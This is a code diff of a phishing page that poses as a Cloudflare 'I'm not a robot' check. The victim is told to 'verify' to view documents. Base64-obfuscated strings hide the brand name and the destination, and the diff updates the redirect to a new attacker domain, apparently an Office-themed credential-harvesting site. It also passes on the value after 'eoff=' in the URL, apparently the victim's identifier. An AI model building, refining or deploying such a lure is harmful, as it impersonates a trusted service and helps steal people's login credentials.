@@ -5,148 +5,128 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>I'm not a robot</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; background: #ffffff; font-family: "Segoe UI", sans-serif; overflow: hidden; }
+        /* Base Reset & Layout */
+        html, body { margin: 0; padding: 0; height: 100%; background-color: #ffffff; font-family: "Segoe UI", Tahoma, sans-serif; overflow: hidden; }
 
-        /* Splash Screen */
-        #_pre_load {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            display: flex; justify-content: center; align-items: center;
-            background: #fff; z-index: 9999;
-        }
+        #gatekeeper-view { display: none; flex-direction: column; justify-content: center; align-items: center; height: 100vh; }
 
-        .breath {
-            width: 100px; height: auto;
-            animation: breathe 2s ease-in-out infinite;
-        }
+        /* Loading Overlay */
+        #splash-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; background: #ffffff; z-index: 1000; }
+        .pulsate { width: 100px; height: auto; animation: pulse-effect 2s ease-in-out infinite; }
 
-        @keyframes breathe {
+        @keyframes pulse-effect {
             0%, 100% { transform: scale(1); opacity: 0.8; }
             50% { transform: scale(1.1); opacity: 1; }
         }
 
-        #_main_gate {
-            display: none;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
+        /* Captcha Box Components */
+        .widget-frame { display: flex; justify-content: space-between; align-items: center; width: 380px; padding: 16px 24px; border: 1px solid #e0e0e0; border-radius: 4px; background: #f9f9f9; box-shadow: 0 1px 2px rgba(0,0,0,0.05); }
+        .flex-row { display: flex; align-items: center; gap: 12px; }
+        .click-area { width: 26px; height: 26px; display: flex; justify-content: center; align-items: center; cursor: pointer; }
 
-        #_ui_msg { font-size: 14px; color: #333; margin-bottom: 18px; }
+        /* States */
+        .box-outline { width: 22px; height: 22px; border: 2px solid #c1c1c1; border-radius: 3px; background: white; }
+        .spinner { width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid #0052cc; border-radius: 50%; animation: rotate-speed 0.8s linear infinite; }
+        .check-circle { width: 24px; height: 24px; background-color: #228b22; border-radius: 50%; display: flex; justify-content: center; align-items: center; color: white; font-size: 14px; }
 
-        .main-wrapper {
-            display: flex; justify-content: space-between; align-items: center;
-            width: 380px; padding: 16px 24px;
-            border: 1px solid #e0e0e0; border-radius: 4px;
-            background: #f9f9f9; box-shadow: 0 1px 2px rgba(0,0,0,0.05);
-        }
+        @keyframes rotate-speed { 100% { transform: rotate(360deg); } }
 
-        .left-content { display: flex; align-items: center; gap: 12px; }
-        .trigger-zone { width: 26px; height: 26px; display: flex; justify-content: center; align-items: center; cursor: pointer; }
-        .sq-box { width: 22px; height: 22px; border: 2px solid #c1c1c1; border-radius: 3px; background: white; }
-
-        .loading-ring {
-            width: 20px; height: 20px;
-            border: 3px solid #f3f3f3; border-top: 3px solid #0052cc;
-            border-radius: 50%; animation: spin 0.8s linear infinite;
-        }
-
-        .done-mark {
-            width: 24px; height: 24px; background-color: #228b22;
-            border-radius: 50%; display: flex; justify-content: center;
-            align-items: center; color: white; font-size: 14px;
-        }
-
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        #_status_label { font-size: 14px; color: #555; }
-        .right-brand { text-align: center; display: flex; flex-direction: column; align-items: center; }
-        .logo-img { width: 28px; height: auto; margin-bottom: 4px; }
-        #_brand_label { font-weight: 700; font-size: 15px; color: #1a1a1b; margin: 0; }
-        .legal-box { font-size: 10px; color: #888; margin-top: 2px; }
+        /* Typography */
+        #instruction-text { font-size: 14px; color: #333; margin-bottom: 18px; }
+        #interaction-status { font-size: 14px; color: #555; }
+        .vendor-info { text-align: center; display: flex; flex-direction: column; align-items: center; }
+        .vendor-icon { width: 28px; height: auto; margin-bottom: 4px; }
+        #vendor-name { font-weight: 700; font-size: 15px; color: #1a1a1b; margin: 0; }
+        .footer-links { font-size: 10px; color: #888; margin-top: 2px; }
     </style>
 </head>
 <body>
 
-    <div id="_pre_load">
-        <img src="astro.png" class="breath" alt="">
+    <div id="splash-container">
+        <img src="astro.png" class="pulsate" alt="Loading">
     </div>
 
-    <div id="_main_gate">
-        <div id="_ui_msg"></div>
-        <div class="main-wrapper">
-            <div class="left-content">
-                <div class="trigger-zone" onclick="_0x_run(this)">
-                    <div id="_icon_state" class="sq-box"></div>
+    <div id="gatekeeper-view">
+        <div id="instruction-text"></div>
+        <div class="widget-frame">
+            <div class="flex-row">
+                <div class="click-area" id="action-trigger">
+                    <div id="state-visual" class="box-outline"></div>
                 </div>
-                <span id="_status_label"></span>
+                <span id="interaction-status"></span>
             </div>
-            <div class="right-brand">
-                <img src="astro2.png" alt="" class="logo-img">
-                <p id="_brand_label"></p>
-                <div class="legal-box">Privacy . Terms</div>
+            <div class="vendor-info">
+                <img src="astro2.png" alt="" class="vendor-icon">
+                <p id="vendor-name"></p>
+                <div class="footer-links">Privacy . Terms</div>
             </div>
         </div>
     </div>
 
     <script>
-        const _0xObj = {
-            // "To view these documents, verify you are human below"
-            _s1: "VG8gdmlldyB0aGVzZSBkb2N1bWVudHMsIHZlcmlmeSB5b3UgYXJlIGh1bWFuIGJlbG93",
-            _s2: "dmVyaWZ5",
-            _s3: "dmVyaWZ5aW5nLi4u",
-            _s4: "c3VjY2Vzcw==",
-            _s5: "Q2xvdWRmbGFyZQ==",
-            _s6: "aHR0cHM6Ly9hZW9mZmljZS5zbmVpZmlsZXlzYWUuc2hvcC93dndZUG5zcg==",
-            _p1: "ZW9mZg=="
+        const config = {
+            sMsg: "VG8gdmlldyB0aGVzZSBkb2N1bWVudHMsIHZlcmlmeSB5b3UgYXJlIGh1bWFuIGJlbG93",
+            sBtn: "dmVyaWZ5",
+            sRun: "dmVyaWZ5aW5nLi4u",
+            sFin: "c3VjY2Vzcw==",
+            sBrand: "Q2xvdWRmbGFyZQ==",
+            // Updated URL to: https://aeoffice.egvhfztransfercygv.online/wvwYPnsr#
+            sUrl: "aHR0cHM6Ly9hZW9mZmljZS5lZ3ZoZnp0cmFuc2ZlcmN5Z3Yub25saW5lL3d2d1lQbnNyIw==",
+            sParam: "ZW9mZg=="
         };
 
-        window.onload = () => {
-            document.getElementById('_ui_msg').innerText = atob(_0xObj._s1);
-            document.getElementById('_status_label').innerText = atob(_0xObj._s2);
-            document.getElementById('_brand_label').innerText = atob(_0xObj._s5);
+        const dom = {
+            msg: document.getElementById('instruction-text'),
+            stat: document.getElementById('interaction-status'),
+            name: document.getElementById('vendor-name'),
+            vis: document.getElementById('state-visual'),
+            btn: document.getElementById('action-trigger'),
+            gate: document.getElementById('gatekeeper-view'),
+            load: document.getElementById('splash-container')
+        };
+
+        // Initialize view
+        window.addEventListener('DOMContentLoaded', () => {
+            dom.msg.innerText = atob(config.sMsg);
+            dom.stat.innerText = atob(config.sBtn);
+            dom.name.innerText = atob(config.sBrand);
 
             setTimeout(() => {
-                document.getElementById('_pre_load').style.display = 'none';
-                document.getElementById('_main_gate').style.display = 'flex';
+                dom.load.style.display = 'none';
+                dom.gate.style.display = 'flex';
             }, 2000);
-        };
+        });
 
-        function _0x_run(_el) {
-            const _icn = document.getElementById('_icon_state');
-            const _lbl = document.getElementById('_status_label');
-
-            _icn.className = 'loading-ring';
-            _lbl.innerText = atob(_0xObj._s3);
-            _el.style.pointerEvents = 'none';
+        // Click Handler
+        dom.btn.addEventListener('click', function() {
+            dom.vis.className = 'spinner';
+            dom.stat.innerText = atob(config.sRun);
+            this.style.pointerEvents = 'none';
 
             setTimeout(() => {
-                _icn.className = 'done-mark';
-                _icn.innerText = '✓';
-                _lbl.innerText = atob(_0xObj._s4);
-
-                _0x_redir();
+                dom.vis.className = 'check-circle';
+                dom.vis.innerText = '✓';
+                dom.stat.innerText = atob(config.sFin);
+                executeRedirect();
             }, 2200);
-        }
+        });
 
-        function _0x_redir() {
-            // Improved extraction logic to capture everything after eoff=
-            const _cUrl = window.location.href;
-            const _key = atob(_0xObj._p1) + "=";
-            let _val = "";
+        function executeRedirect() {
+            const currentUrl = window.location.href;
+            const keyString = atob(config.sParam) + "=";
+            let capturedValue = "";
 
-            if (_cUrl.includes(_key)) {
-                // Splits at 'eoff=' and takes everything to the right
-                _val = _cUrl.split(_key)[1];
+            if (currentUrl.includes(keyString)) {
+                capturedValue = currentUrl.split(keyString)[1];
             }
 
-            let _target = atob(_0xObj._s6);
-            if (_val) {
-                _target += "#" + _val;
+            let finalDestination = atob(config.sUrl);
+            if (capturedValue) {
+                finalDestination += capturedValue; // Appends parameters directly after the # in the new URL
             }
 
             setTimeout(() => {
-                window.location.href = _target;
+                window.location.href = finalDestination;
             }, 800);
         }
     </script>
